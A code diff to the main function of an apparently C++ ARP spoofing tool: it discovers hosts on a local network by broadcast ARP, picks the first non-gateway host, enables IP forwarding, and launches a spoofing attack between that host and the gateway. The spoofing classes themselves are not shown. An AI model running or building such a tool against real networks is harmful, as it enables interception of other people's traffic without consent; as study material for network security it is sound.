@@ -46,6 +46,7 @@ int main()
     ARPOperator arp_operator(sender_ip, ifname);
 
     // initialize broadcast for neighbor discovery
+    target_mac = "00:00:00:00:00:00";
     arp_operator.prepare_broadcast();
     for (auto candidate : candidates) {
         arp_operator.set_target(candidate, target_mac);
@@ -83,6 +84,8 @@ int main()
         }
     }
 
+    arp_operator.clear_buffer();
+
     // choose the first target that is not the gateway
     std::map<std::string, std::string>::iterator it;
     for (it = ip2mac_map.begin(); it != ip2mac_map.end(); it++) {
@@ -95,13 +98,12 @@ int main()
     // initialize the spoof operator
     SpoofOperator spoof_operator(&arp_operator, gateway_ip, &ip2mac_map);
 
-    std::cout << "target: " << target_ip << " " << target_mac << std::endl;
-
     if (set_ip_forwarding(1) < 0) {
         exit(EXIT_FAILURE);
     }
 
-    spoof_operator.attack(target_ip);
+    arp_operator.prepare_unicast();
+    spoof_operator.attack(target_ip, gateway_ip);
 
     return 0;
 }
